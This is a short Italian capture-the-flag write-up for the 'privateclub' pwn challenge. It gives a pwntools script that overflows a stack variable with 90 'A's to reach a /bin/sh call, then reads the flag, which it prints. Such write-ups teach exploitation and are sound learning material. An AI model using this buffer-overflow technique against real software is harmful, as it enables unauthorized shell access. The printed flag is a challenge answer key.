> Solo chi ha il badge potrà entrare nel mio club privato :)

Si può risolvere con uno script python:

```python
from pwn import *

context.log_level = 'error'
elf = ELF("privateclub")
r = remote("privateclub.challs.olicyber.it", 10015)
r.recvuntil("\n")
r.sendline("19")
r.recvuntil("\n")
r.sendline("A" * 90)
r.interactive()
```

Dato che per la logica del programma se la variabile `local_14` contiene un valore diverso da `0x10` il viene eseguito `/bin/sh`, potremmo tentare di sovrascrivere il valore di quella variabile grazie ad un overflow al momento della richiesta del nostro nome. COsì otteniamo la shell e possiamo cattuare la flag con `cat flag.txt`.

**flag{b4d_sc4nf}**